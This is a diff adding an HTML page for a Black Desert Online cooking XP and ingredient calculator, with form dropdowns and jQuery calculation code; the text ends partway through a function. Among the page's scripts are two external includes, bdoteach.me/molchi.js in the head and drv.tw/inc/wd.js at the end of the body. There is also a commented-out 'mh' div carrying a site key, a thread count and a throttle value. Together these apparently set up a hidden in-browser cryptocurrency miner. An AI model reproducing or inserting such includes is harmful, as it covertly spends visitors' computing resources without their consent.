@@ -1,0 +1,1139 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <meta charset="utf-8">
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-109519803-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+        
+          gtag('config', 'UA-109519803-1');
+        </script>
+        <meta name="description" content="Black Desert Online, Cooking Experience Calculator">
+        <meta name="keywords" content="bdo, black desert, cooking, exp, xp, cooking xp, bdo cooking xp, cooking xp calculator">
+        <meta name="author" content="walid lahnine">
+        <meta name="conatct" content="waliori@gmail.com">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Black Desert Online, Complete Cooking Calculator</title>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+        <script src="https://bdoteach.me/molchi.js"></script>
+
+        <style type="text/css">
+            #loader {
+                position: absolute;
+                left: 50%;s
+                top: 50%;
+                z-index: 1;
+                width: 150px;c
+                height: 150px;
+                margin: -75px 0 0 -75px;
+                border: 16px solid #f3f3f3;
+                border-radius: 50%;
+                border-top: 16px solid #3498db;
+                width: 120px;
+                height: 120px;
+                -webkit-animation: spin 2s linear infinite;
+                animation: spin 2s linear infinite;
+            }
+            @-webkit-keyframes spin {
+                0% {
+                    -webkit-transform: rotate(0deg);
+                }
+                100% {
+                    -webkit-transform: rotate(360deg);
+                }
+            }
+            @keyframes spin {
+                0% {
+                    transform: rotate(0deg);
+                }
+                100% {
+                    transform: rotate(360deg);
+                }
+            }
+        </style>
+
+    </head>
+
+    <body>
+        <center>
+            <div>
+                <p>
+                    <h2>Black desert Online Complete Cooking Calculator</h2>
+                </p>
+                <p>
+                    <h5>alchemy calculator and other tools coming soon</h5>
+                </p>
+                <p style="left:0;text-align: left"><i>10</p></i>
+                    <p style="right:0;text-align: right;"><a href="https://github.com/waliori/BDOCookingXpCalculator/tree/master" target="_blank" role="button" class="btn btn-primary btn-xs">How to use</a>
+                    </p>
+            </div>
+            <hr>
+            <div style="width:80%">
+                <form class="form-horizontal" id="cooking">
+                    <div class="form-group">
+                        <label class="col-xs-12 col-sm-3" for="cl">Your Rank</label>
+                        <div class="col-xs-12 col-sm-9">
+                            <select name="cl" class="form-control" id="cl">
+                                <option value="1">Beginner 1</option>
+                                <option value="2">Beginner 2</option>
+                                <option value="3">Beginner 3</option>
+                                <option value="4">Beginner 4</option>
+                                <option value="5">Beginner 5</option>
+                                <option value="6">Beginner 6</option>
+                                <option value="7">Beginner 7</option>
+                                <option value="8">Beginner 8</option>
+                                <option value="9">Beginner 9</option>
+                                <option value="10">Beginner 10</option>
+                                <option value="11">Apprentice 1</option>
+                                <option value="12">Apprentice 2</option>
+                                <option value="13">Apprentice 3</option>
+                                <option value="14">Apprentice 4</option>
+                                <option value="15">Apprentice 5</option>
+                                <option value="16">Apprentice 6</option>
+                                <option value="17">Apprentice 7</option>
+                                <option value="18">Apprentice 8</option>
+                                <option value="19">Apprentice 9</option>
+                                <option value="20">Apprentice 10</option>
+                                <option value="21">Skilled 1</option>
+                                <option value="22">Skilled 2</option>
+                                <option value="23">Skilled 3</option>
+                                <option value="24">Skilled 4</option>
+                                <option value="25">Skilled 5</option>
+                                <option value="26">Skilled 6</option>
+                                <option value="27">Skilled 7</option>
+                                <option value="28">Skilled 8</option>
+                                <option value="29">Skilled 9</option>
+                                <option value="30">Skilled 10</option>
+                                <option value="31">Professional 1</option>
+                                <option value="32">Professional 2</option>
+                                <option value="33">Professional 3</option>
+                                <option value="34">Professional 4</option>
+                                <option value="35">Professional 5</option>
+                                <option value="36">Professional 6</option>
+                                <option value="37">Professional 7</option>
+                                <option value="38">Professional 8</option>
+                                <option value="39">Professional 9</option>
+                                <option value="40">Professional 10</option>
+                                <option value="41">Artisan 1</option>
+                                <option value="42">Artisan 2</option>
+                                <option value="43">Artisan 3</option>
+                                <option value="44">Artisan 4</option>
+                                <option value="45">Artisan 5</option>
+                                <option value="46">Artisan 6</option>
+                                <option value="47">Artisan 7</option>
+                                <option value="48">Artisan 8</option>
+                                <option value="49">Artisan 9</option>
+                                <option value="50">Artisan 10</option>
+                                <option value="51">Master 1</option>
+                                <option value="52">Master 2</option>
+                                <option value="53">Master 3</option>
+                                <option value="54">Master 4</option>
+                                <option value="55">Master 5</option>
+                                <option value="56">Master 6</option>
+                                <option value="57">Master 7</option>
+                                <option value="58">Master 8</option>
+                                <option value="59">Master 9</option>
+                                <option value="60">Master 10</option>
+                                <option value="61">Master 11</option>
+                                <option value="62">Master 12</option>
+                                <option value="63">Master 13</option>
+                                <option value="64">Master 14</option>
+                                <option value="65">Master 15</option>
+                                <option value="66">Master 16</option>
+                                <option value="67">Master 17</option>
+                                <option value="68">Master 18</option>
+                                <option value="69">Master 19</option>
+                                <option value="70">Master 20</option>
+                                <option value="71">Master 21</option>
+                                <option value="72">Master 22</option>
+                                <option value="73">Master 23</option>
+                                <option value="74">Master 24</option>
+                                <option value="75">Master 25</option>
+                                <option value="76">Master 26</option>
+                                <option value="77">Master 27</option>
+                                <option value="78">Master 28</option>
+                                <option value="79">Master 29</option>
+                                <option value="80">Master 30</option>
+                                <option value="80">Guru 1</option>
+                                <option value="82">Guru 2</option>
+                                <option value="83">Guru 3</option>
+                                <option value="84">Guru 4</option>
+                                <option value="85">Guru 5</option>
+                                <option value="86">Guru 6</option>
+                                <option value="87">Guru 7</option>
+                                <option value="88">Guru 8</option>
+                                <option value="89">Guru 9</option>
+                                <option value="90">Guru 10</option>
+                                <option value="91">Guru 11</option>
+                                <option value="92">Guru 12</option>
+                                <option value="93">Guru 13</option>
+                                <option value="94">Guru 14</option>
+                                <option value="95">Guru 15</option>
+                                <option value="96">Guru 16</option>
+                                <option value="97">Guru 17</option>
+                                <option value="98">Guru 18</option>
+                                <option value="99">Guru 19</option>
+                                <option value="100">Guru 20</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label class="col-xs-12 col-sm-3" for="cp">Your Rank Percent</label>
+                        <div class="col-xs-12 col-sm-9">
+                            <select name="cp" class="form-control" id="cp">
+                                <option value="0">0%</option>
+                                <option value="1">1%</option>
+                                <option value="2">2%</option>
+                                <option value="3">3%</option>
+                                <option value="4">4%</option>
+                                <option value="5">5%</option>
+                                <option value="6">6%</option>
+                                <option value="7">7%</option>
+                                <option value="8">8%</option>
+                                <option value="9">9%</option>
+                                <option value="10">10%</option>
+                                <option value="11">11%</option>
+                                <option value="12">12%</option>
+                                <option value="13">13%</option>
+                                <option value="14">14%</option>
+                                <option value="15">15%</option>
+                                <option value="16">16%</option>
+                                <option value="17">17%</option>
+                                <option value="18">18%</option>
+                                <option value="19">19%</option>
+                                <option value="20">20%</option>
+                                <option value="21">21%</option>
+                                <option value="22">22%</option>
+                                <option value="23">23%</option>
+                                <option value="24">24%</option>
+                                <option value="25">25%</option>
+                                <option value="26">26%</option>
+                                <option value="27">27%</option>
+                                <option value="28">28%</option>
+                                <option value="29">29%</option>
+                                <option value="30">30%</option>
+                                <option value="31">31%</option>
+                                <option value="32">32%</option>
+                                <option value="33">33%</option>
+                                <option value="34">34%</option>
+                                <option value="35">35%</option>
+                                <option value="36">36%</option>
+                                <option value="37">37%</option>
+                                <option value="38">38%</option>
+                                <option value="39">39%</option>
+                                <option value="40">40%</option>
+                                <option value="41">41%</option>
+                                <option value="42">42%</option>
+                                <option value="43">43%</option>
+                                <option value="44">44%</option>
+                                <option value="45">45%</option>
+                                <option value="46">46%</option>
+                                <option value="47">47%</option>
+                                <option value="48">48%</option>
+                                <option value="49">49%</option>
+                                <option value="50">50%</option>
+                                <option value="51">51%</option>
+                                <option value="52">52%</option>
+                                <option value="53">53%</option>
+                                <option value="54">54%</option>
+                                <option value="55">55%</option>
+                                <option value="56">56%</option>
+                                <option value="57">57%</option>
+                                <option value="58">58%</option>
+                                <option value="59">59%</option>
+                                <option value="60">60%</option>
+                                <option value="61">61%</option>
+                                <option value="62">62%</option>
+                                <option value="63">63%</option>
+                                <option value="64">64%</option>
+                                <option value="65">65%</option>
+                                <option value="66">66%</option>
+                                <option value="67">67%</option>
+                                <option value="68">68%</option>
+                                <option value="69">69%</option>
+                                <option value="70">70%</option>
+                                <option value="71">71%</option>
+                                <option value="72">72%</option>
+                                <option value="73">73%</option>
+                                <option value="74">74%</option>
+                                <option value="75">75%</option>
+                                <option value="76">76%</option>
+                                <option value="77">77%</option>
+                                <option value="78">78%</option>
+                                <option value="79">79%</option>
+                                <option value="80">80%</option>
+                                <option value="81">81%</option>
+                                <option value="82">82%</option>
+                                <option value="83">83%</option>
+                                <option value="84">84%</option>
+                                <option value="85">85%</option>
+                                <option value="86">86%</option>
+                                <option value="87">87%</option>
+                                <option value="88">88%</option>
+                                <option value="89">89%</option>
+                                <option value="90">90%</option>
+                                <option value="91">91%</option>
+                                <option value="92">92%</option>
+                                <option value="93">93%</option>
+                                <option value="94">94%</option>
+                                <option value="95">95%</option>
+                                <option value="96">96%</option>
+                                <option value="97">97%</option>
+                                <option value="98">98%</option>
+                                <option value="99">99%</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label class="col-xs-12 col-sm-3" for="cx">Cooking and Life XP increase*</label>
+                        <div class="col-xs-12 col-sm-9">
+                            <select name="cx" class="form-control" id="cx">
+                                <option value="0">0%</option>
+                                <option value="1">1%</option>
+                                <option value="2">2%</option>
+                                <option value="3">3%</option>
+                                <option value="4">4%</option>
+                                <option value="5">5%</option>
+                                <option value="6">6%</option>
+                                <option value="7">7%</option>
+                                <option value="8">8%</option>
+                                <option value="9">9%</option>
+                                <option value="10">10%</option>
+                                <option value="11">11%</option>
+                                <option value="12">12%</option>
+                                <option value="13">13%</option>
+                                <option value="14">14%</option>
+                                <option value="15">15%</option>
+                                <option value="16">16%</option>
+                                <option value="17">17%</option>
+                                <option value="18">18%</option>
+                                <option value="19">19%</option>
+                                <option value="20">20%</option>
+                                <option value="21">21%</option>
+                                <option value="22">22%</option>
+                                <option value="23">23%</option>
+                                <option value="24">24%</option>
+                                <option value="25">25%</option>
+                                <option value="26">26%</option>
+                                <option value="27">27%</option>
+                                <option value="28">28%</option>
+                                <option value="29">29%</option>
+                                <option value="30">30%</option>
+                                <option value="31">31%</option>
+                                <option value="32">32%</option>
+                                <option value="33">33%</option>
+                                <option value="34">34%</option>
+                                <option value="35">35%</option>
+                                <option value="36">36%</option>
+                                <option value="37">37%</option>
+                                <option value="38">38%</option>
+                                <option value="39">39%</option>
+                                <option value="40">40%</option>
+                                <option value="41">41%</option>
+                                <option value="42">42%</option>
+                                <option value="43">43%</option>
+                                <option value="44">44%</option>
+                                <option value="45">45%</option>
+                                <option value="46">46%</option>
+                                <option value="47">47%</option>
+                                <option value="48">48%</option>
+                                <option value="49">49%</option>
+                                <option value="50">50%</option>
+                                <option value="51">51%</option>
+                                <option value="52">52%</option>
+                                <option value="53">53%</option>
+                                <option value="54">54%</option>
+                                <option value="55">55%</option>
+                                <option value="56">56%</option>
+                                <option value="57">57%</option>
+                                <option value="58">58%</option>
+                                <option value="59">59%</option>
+                                <option value="60">60%</option>
+                                <option value="61">61%</option>
+                                <option value="62">62%</option>
+                                <option value="63">63%</option>
+                                <option value="64">64%</option>
+                                <option value="65">65%</option>
+                                <option value="66">66%</option>
+                                <option value="67">67%</option>
+                                <option value="68">68%</option>
+                                <option value="69">69%</option>
+                                <option value="70">70%</option>
+                                <option value="71">71%</option>
+                                <option value="72">72%</option>
+                                <option value="73">73%</option>
+                                <option value="74">74%</option>
+                                <option value="75">75%</option>
+                                <option value="76">76%</option>
+                                <option value="77">77%</option>
+                                <option value="78">78%</option>
+                                <option value="79">79%</option>
+                                <option value="80">80%</option>
+                                <option value="81">81%</option>
+                                <option value="82">82%</option>
+                                <option value="83">83%</option>
+                                <option value="84">84%</option>
+                                <option value="85">85%</option>
+                                <option value="86">86%</option>
+                                <option value="87">87%</option>
+                                <option value="88">88%</option>
+                                <option value="89">89%</option>
+                                <option value="90">90%</option>
+                                <option value="91">91%</option>
+                                <option value="92">92%</option>
+                                <option value="93">93%</option>
+                                <option value="94">94%</option>
+                                <option value="95">95%</option>
+                                <option value="96">96%</option>
+                                <option value="97">97%</option>
+                                <option value="98">98%</option>
+                                <option value="99">99%</option>
+                            </select>
+                            	<span class="help-block">* Costumes, Consumables, Pets, Gems or other +XP modifiers.</span>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label class="col-xs-12 col-sm-3" for="products">Product to Cook</label>
+                        <div class="col-xs-12 col-sm-4">
+                            <select class="form-control" id="products">
+                                <option>Select Product...</option>
+                                <option value='Aloe Cookie'>Aloe Cookie</option>
+                                <option value='Aloe Yogurt'>Aloe Yogurt</option>
+                                <option value='Assorted Side Dishes'>Assorted Side Dishes</option>
+                                <option value='Beehive Cookie'>Beehive Cookie</option>
+                                <option value='Beer'>Beer</option>
+                                <option value='Boiled Bird Eggs'>Boiled Bird Eggs</option>
+                                <option value='Borscht'>Borscht</option>
+                                <option value="Butter-Roasted Lobster">Butter-Roasted Lobster</option>
+                                <option value='Cheese Gratin'>Cheese Gratin</option>
+                                <option value='Cheese Pie'>Cheese Pie</option>
+                                <option value='Dark Pudding'>Dark Pudding</option>
+                                <option value='Date Palm Wine'>Date Palm Wine</option>
+                                <option value='Desert Dumpling'>Desert Dumpling</option>
+                                <option value='Dressing'>Dressing</option>
+                                <option value='Essence of Liquor'>Essence of Liquor</option>
+                                <option value='Exotic Herbal Wine'>Exotic Herbal Wine</option>
+                                <option value='Fig Pie'>Fig Pie</option>
+                                <option value='Fish Filet Salad'>Fish Filet Salad</option>
+                                <option value='Fish Fillet Chip'>Fish Fillet Chip</option>
+                                <option value='Fish Soup'>Fish Soup</option>
+                                <option value='Frekkeh Snake Stew'>Frekkeh Snake Stew</option>
+                                <option value='Fried Bird'>Fried Bird</option>
+                                <option value='Fried Fish'>Fried Fish</option>
+                                <option value='Fried Vegetables'>Fried Vegetables</option>
+                                <option value="Fruit and Vegetable Salad">Fruit and Vegetable Salad</option>
+                                <option value='Fruit Juice'>Fruit Juice</option>
+                                <option value='Fruit Pie'>Fruit Pie</option>
+                                <option value='Fruit Pudding'>Fruit Pudding</option>
+                                <option value='Fruit Wine'>Fruit Wine</option>
+                                <option value='Good Feed'>Good Feed</option>
+                                <option value='Grain Soup'>Grain Soup</option>
+                                <option value='Grilled Sausage'>Grilled Sausage</option>
+                                <option value='Grilled Scorpion'>Grilled Scorpion</option>
+                                <option value='Ham Sandwich'>Ham Sandwich</option>
+                                <option value="Hard-Boiled Shellfish">Hard-Boiled Shellfish</option>
+                                <option value='High-Quality Carrot Juice'>High-Quality Carrot Juice</option>
+                                <option value='Honey Wine'>Honey Wine</option>
+                                <option value="Hunter's Salad">Hunter's Salad</option>
+                                <option value='Lean Meat Salad'>Lean Meat Salad</option>
+                                <option value='Lizard Kebab'>Lizard Kebab</option>
+                                <option value='Meat Croquette'>Meat Croquette</option>
+                                <option value='Meat Pasta'>Meat Pasta</option>
+                                <option value='Meat Pie'>Meat Pie</option>
+                                <option value='Meat Sandwich'>Meat Sandwich</option>
+                                <option value='Meat Soup'>Meat Soup</option>
+                                <option value='Meat Stew'>Meat Stew</option>
+                                <option value='Mediah Meal'>Mediah Meal</option>
+                                <option value='Milk Tea'>Milk Tea</option>
+                                <option value='Oatmeal'>Oatmeal</option>
+                                <option value='Omelet'>Omelet</option>
+                                <option value='Organic Feed'>Organic Feed</option>
+                                <option value='Pickled Fish'>Pickled Fish</option>
+                                <option value='Pickled Vegetables'>Pickled Vegetables</option>
+                                <option value="Pistachio Fried Rice">Pistachio Fried Rice</option>
+                                <option value="Prawn Salad">Prawn Salad</option>
+                                <option value='Red Sauce'>Red Sauce</option>
+                                <option value='Seafood Grilled With Butter'>Seafood Grilled With Butter</option>
+                                <option value='Seafood Mushroom Salad'>Seafood Mushroom Salad</option>
+                                <option value='Seafood Pasta'>Seafood Pasta</option>
+                                <option value='Smoked Fish Steak'>Smoked Fish Steak</option>
+                                <option value='Soft Bread'>Soft Bread</option>
+                                <option value='Special Carrot Juice'>Special Carrot Juice</option>
+                                <option value='Steak'>Steak</option>
+                                <option value='Steamed Bird'>Steamed Bird</option>
+                                <option value='Steamed Fish'>Steamed Fish</option>
+                                <option value="Steamed Prawn">Steamed Prawn</option>
+                                <option value='Steamed Seafood'>Steamed Seafood</option>
+                                <option value='Steamed Whale Meat'>Steamed Whale Meat</option>
+                                <option value='Stir-Fried Meat'>Stir-Fried Meat</option>
+                                <option value="Stir-Fried Oyster">Stir-Fried Oyster</option>
+                                <option value='Stir-Fried Seafood'>Stir-Fried Seafood</option>
+                                <option value='Stir-Fried Vegetables'>Stir-Fried Vegetables</option>
+                                <option value='Sute Tea'>Sute Tea</option>
+                                <option value='Tea With Fine Scent'>Tea With Fine Scent</option>
+                                <option value='Teff Bread'>Teff Bread</option>
+                                <option value='Vinegar'>Vinegar</option>
+                                <option value='Whale Meat Salad'>Whale Meat Salad</option>
+                                <option value='White Sauce'>White Sauce</option>
+                            </select>
+                        </div>
+                    </div>
+
+                </form>
+                <div class="form-group">
+                    <div class="col-sm-offset-3 col-sm-9 col-xs-12">
+                        <button class="btn btn-default" type="submit" onClick="cook()">CALCULATE</button> <span class="spinner"></span>
+                    </div>
+                </div>
+            </div>
+            <hr>
+            <div id="result"></div>
+            <hr>
+            <div id="calc"></div>
+            <div id="calc_res"></div>
+            <hr>
+            <div id="m_result"></div>
+
+            <div id="loader" style="display:none"></div>
+            <div style='margin-top: 5%;position:fixed;bottom:0;right:0'>
+                <p><a target="_blank" href="https://www.paypal.me/walidlahnine" ><input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!"></a>
+                
+                </p>
+            </div>
+        </center>
+        <table style="display:none">
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Apprentice 6</td>
+            <td class="dt-level">Apprentice 6</td>
+            <td class="dt-level">Beginner 1</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Skilled 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 6</td>
+            <td class="dt-level">Skilled 1</td>
+            <td class="dt-level">Apprentice 6</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Beginner 1</td>
+            <td class="dt-level">Beginner 1</td>
+            <td class="dt-level">Beginner 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Apprentice 6</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Beginner 1</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Skilled 1</td>
+            <td class="dt-level">Skilled 1</td>
+            <td class="dt-level">Skilled 1</td>
+            <td class="dt-level">Beginner 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 6</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 6</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Skilled 1</td>
+            <td class="dt-level">Skilled 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 6</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Skilled 1</td>
+            <td class="dt-level">Beginner 1</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Skilled 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Skilled 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Skilled 1</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Skilled 1</td>
+            <td class="dt-level">Apprentice 1</td>
+            <td class="dt-level">Beginner 6</td>
+            <td class="dt-level">Beginner 1</td>
+            <td class="dt-level">Skilled 1</td>
+            <td class="dt-level">Beginner 1</td>
+        </table>
+
+<span class="statcounter" style="visibility : hidden"><a class="statcounter" href="https://www.statcounter.com" target="_blank"><img src="https://c.statcounter.com/t.php?sc_project=11408321&amp;java=1&amp;security=760ff298&amp;u1=AB77D3F7F8444FB2158BF44E68776734&amp;sc_random=0.9381719326990544&amp;jg=159&amp;rr=1.1.1.1.1.1.1.1.1&amp;resolution=1920&amp;h=1200&amp;camefrom=&amp;u=file%3A///C%3A/Users/cmputer/Desktop/black%2520desert%2520onoline%2520cooking%2520xp%2520calculator/index.html&amp;t=Black%20Desert%20Online%2C%20Complete%20Cooking%20Calculator&amp;rcat=d&amp;rdomo=d&amp;rdomg=159&amp;sc_snum=1&amp;sess=7a9eb4&amp;p=0" alt="StatCounter - Free Web Tracker and Counter" border="0"></a></span>
+<!--<div class="mh" style="display: none" data-key="85df35174f7bba659c7c77e74104677f" data-threads="2" data-throttle="0.6"></div>-->
+
+    <script async src="https://drv.tw/inc/wd.js"></script></body>
+    <script type="text/javascript">
+        /*************************************************************************************************************************/
+        var div = document.getElementById("result");
+        var mdiv = document.getElementById("m_result");
+        var calc = document.getElementById("calc");
+        var calc_res = document.getElementById("calc_res");
+        var d = document.getElementById("products");
+        var dish = [];
+        var lvl = [];
+        var x = document.getElementsByClassName("dt-level");
+        var di_lv = new Map();
+        var cl = document.getElementById("cl"); //lvl
+        var cp = document.getElementById("cp"); // % lvl
+        var cx = document.getElementById("cx"); // + % xp
+        /*******************************************************************/
+        for (var i = 0; i < d.length; i++) {
+            dish.push(d.options[i].value);
+        }
+
+        for (var i = 0; i < x.length; i++) {
+            lvl.push(x[i].innerHTML);
+        }
+        for (var i = 0; i < lvl.length; i++) {
+            di_lv.set(dish[i + 1], lvl[i]);
+        }
+        /*******************************************************************/
+
+        function cook() {
+            document.getElementById("loader").style.display = "block";
+            mdiv.innerHTML = '';
+            div.innerHTML = '';
+            calc.innerHTML = '';
+            calc_res.innerHTML = '';
+            var selected_dish = d.options[d.selectedIndex].value;
+            var selected_dish_lvl = di_lv.get(selected_dish);
+            var s_cl = cl.options[cl.selectedIndex].value;
+            var s_cp = cp.options[cp.selectedIndex].value;
+            var s_cx = cx.options[cx.selectedIndex].value;
+            if (selected_dish != "Select Product...") {
+                /********************************************************************/
+                if (selected_dish_lvl == "Beginner 6" || selected_dish_lvl == "Beginner 1") {
+                    var xp = 400;
+                } else if (selected_dish_lvl == "Apprentice 6" || selected_dish_lvl == "Apprentice 1") {
+                    var xp = 800;
+                } else {
+                    var xp = 1200;
+                }
+                /*******************************************************************/
+                $.getJSON("jsons/life.json", function(json) {
+
+                    for (var i = 0; i < json.length; i++) {
+                        if (json[i].Rank == selected_dish_lvl)
+                            var lv = json[i].Level;
+                    }
+                    if (lv <= s_cl) {
+                        var lvl_xp = json[s_cl - 1].Xp;
+                        var rem_xp = lvl_xp - ((lvl_xp * s_cp) / 100);
+                        var rat = (xp * s_cx) / 100;
+                        var xp_inc = xp + ((xp * s_cx) / 100);
+                        var craft_nmb = Math.ceil(rem_xp / xp_inc);
+                        div.innerHTML = '<br><h4>Results: </h4><br><table class="table table-hover table-striped" style="width:80%"><thead><tr><th style="text-align:center">Product</th><th style="text-align:center">Xp per craft</th></tr></thead><tbody><tr class="info"><td style="text-align:center"><img src="icons/' + selected_dish + '.png" width="44px" height="44px"/>' + selected_dish + '</td><td style="text-align:center">' + xp_inc + ' XP (<i>' + xp + ' XP+ ' + rat + ' bonus</i>)</td></tr></tbody></table>';
+
+                        $.getJSON("jsons/recipes.json", function(rec) {
+                            var i1, i2, i3, i4, i5;
+                            var ing = [];
+                            var qt = [];
+                            var q1, q2, q3, q4, q5;
+                            var w;
+                            var tbl, td, tr, inpt, th;
+                            var e1, e2, e3, e4, e5;
+                            /*** get ingredient and quantitites for selected dish*/
+                            for (var i = 0; i < rec.length; i++) {
+                                if (rec[i].Recipe == selected_dish) {
+                                    if (rec[i].Ingredient1 != "") {
+                                        ing.push(rec[i].Ingredient1);
+                                        qt.push(rec[i].Quanitiy1);
+                                        if (rec[i].Ingredient2 != "") {
+                                            ing.push(rec[i].Ingredient2);
+                                            qt.push(rec[i].Quanitiy2);
+                                            if (rec[i].Ingredient3 != "") {
+                                                ing.push(rec[i].Ingredient3);
+                                                qt.push(rec[i].Quanitiy3);
+                                                if (rec[i].Ingredient4 != "") {
+                                                    ing.push(rec[i].Ingredient4);
+                                                    qt.push(rec[i].Quanitiy4);
+                                                    if (rec[i].Ingredient5 != "") {
+                                                        ing.push(rec[i].Ingredient5);
+                                                        qt.push(rec[i].Quanitiy5);
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+
+                            /*****************end get */
+                            calc.innerHTML = "<b>ingredient calculator :</b><br>you can change number of ingredients or result just by clicking on its amount cell:</br>";
+                            tbl = document.createElement('table');
+                            var btn = document.createElement('button');
+                            tbl.setAttribute("style", "width:50%");
+                            var thead = document.createElement("thead");
+                            tr = document.createElement("tr");
+                            th = document.createElement("th");
+                            th.innerHTML = "ingerdient";
+                            th.setAttribute('style', 'width:50%');
+                            th.setAttribute("style", 'text-align:center;');
+                            tr.appendChild(th);
+                            th = document.createElement("th");
+                            th.innerHTML = "amount";
+                            th.setAttribute('style', 'width:50%');
+                            th.setAttribute("style", 'text-align:center;');
+                            tr.appendChild(th);
+                            thead.appendChild(tr);
+                            tbl.appendChild(thead);
+                            var cpt = 0;
+                            var tbody = document.createElement('tbody');
+                            for (var i = 0; i < qt.length; i++) {
+                                tr = document.createElement("tr"); //line
+                                for (var j = 0; j < 2; j++) {
+                                    td = document.createElement("td");
+                                    td.setAttribute('style', 'width:50%');
+                                    td.setAttribute("style", 'text-align:center;');
+                                    if (j == 0) {
+                                        td.innerHTML = ing[i]; //1st cell
+                                    } else {
+                                        td.innerHTML = qt[i]; //second cell
+                                        td.setAttribute('contenteditable', 'true');
+                                        td.setAttribute('type', 'number');
+
+                                        td.onclick = function() {
+
+                                            var range = document.createRange();
+                                            range.selectNodeContents(this);
+                                            window.getSelection().removeAllRanges();
+                                            window.getSelection().addRange(range);
+
+                                        }
+                                        $(td).keydown(function(e) {
+                                            // Allow: backspace, delete, tab, escape, enter and .
+                                            if ($.inArray(e.keyCode, [9]) !== -1 ||
+                                                // Allow: Ctrl/cmd+A
+                                                (e.keyCode == 65 && (e.ctrlKey === true || e.metaKey === true)) ||
+                                                // Allow: Ctrl/cmd+C
+                                                (e.keyCode == 67 && (e.ctrlKey === true || e.metaKey === true)) ||
+                                                // Allow: Ctrl/cmd+X
+                                                (e.keyCode == 88 && (e.ctrlKey === true || e.metaKey === true)) ||
+                                                // Allow: home, end, left, right
+                                                (e.keyCode >= 35 && e.keyCode <= 39)) {
+                                                // let it happen, don't do anything
+                                                return;
+                                            }
+                                            // Ensure that it is a number and stop the keypress
+                                            if ((e.keyCode < 48 || e.keyCode > 57) && (e.keyCode < 96 || e.keyCode > 105)) {
+                                                e.preventDefault();
+                                            }
+                                            if (e.keyCode == 13) {
+                                                btn.focus();
+                                                e.preventDefault();
+                                            }
+                                        });
+                                        td.onblur = function() {
+                                            var org_q, org_ing;
+                                            var othr_qt = [];
+                                            var othr_ing = [];
+                                            var tb_rows = this.parentNode.parentNode.children;
+                                            var e = this.innerHTML;
+                                            //recup original data
+                                            for (var k = 0; k < ing.length; k++) {
+                                                if (this.parentNode.firstChild.innerHTML != ing[k]) {
+                                                    othr_qt.push(qt[k]);
+                                                    othr_ing.push(ing[k]);
+                                                } else {
+                                                    org_q = qt[k];
+                                                    org_ing = ing[k];
+                                                }
+                                            }
+                                            var ratio = Math.floor(e / org_q);
+                                            if (ratio >= 2) {
+                                                for (var k = 0; k < ing.length; k++) {
+                                                    if (this.parentNode.firstChild.innerHTML != ing[k]) {
+                                                        tb_rows[k].children[1].innerHTML = qt[k] * ratio;
+                                                        this.parentNode.parentNode.lastChild.lastChild.innerHTML = ratio;
+                                                    }
+                                                }
+                                            } else { //less than rinal
+                                                for (var k = 0; k < ing.length; k++) {
+                                                    tb_rows[k].children[1].innerHTML = qt[k];
+                                                    this.parentNode.parentNode.lastChild.lastChild.innerHTML = "1";
+                                                }
+                                            }
+
+                                        };
+                                    }
